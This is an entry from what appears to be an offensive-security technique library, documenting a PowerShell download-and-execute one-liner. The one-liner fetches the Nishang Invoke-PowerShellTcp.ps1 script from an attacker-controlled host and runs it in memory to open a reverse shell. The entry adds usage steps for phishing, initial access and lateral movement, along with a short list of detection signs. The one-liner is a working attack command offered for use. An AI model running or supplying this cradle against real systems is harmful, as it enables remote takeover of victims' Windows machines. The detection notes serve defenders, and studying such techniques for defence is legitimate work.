---
id: 189115a2-810b-4f37-9e25-10cb95cf7d9b
type: code
name: powershell-download-and-execute-remote-script
language: powershell
verified: true
created_at: '2020-02-21T05:44:08.385809+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Windows
tags:
  - powershell
  - download
  - execution
  - payload
validated: true
---

# powershell-download-and-execute-remote-script

## Code

```powershell
iex (New-Object Net.WebClient).downloadString('http://$_TARGET_IP/Invoke-PowerShellTcp.ps1')
```

## Description

This PowerShell one-liner downloads a remote script (e.g., Nishang's Invoke-PowerShellTcp.ps1 for a TCP reverse shell) from an attacker-controlled server and executes it immediately using Invoke-Expression (IEX). It serves as a common download cradle for delivering post-exploitation payloads without writing files to disk.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_TARGET_IP | IP address or hostname of the attacker's server hosting the script | 10.10.10.10 |

## Usage

Embed this code in a larger payload or encode it for execution via command line. Host the target script (e.g., Invoke-PowerShellTcp.ps1) on a web server at the specified URL. Start a listener (e.g., netcat) on the attacker side before execution to catch the reverse shell. Commonly used in phishing, initial access, or lateral movement scenarios.

## Detection

- PowerShell Script Block Logging capturing IEX invocations and download URLs.
- Network traffic to external IPs on HTTP/HTTPS for .ps1 files.
- AMSI scans detecting the WebClient download pattern.
- Process creation events for powershell.exe spawning child processes like cmd.exe.

## Related

- [[procedures/Encode-and-Execute-Base64-PowerShell-Command]]
- [[tools/Powershell]]
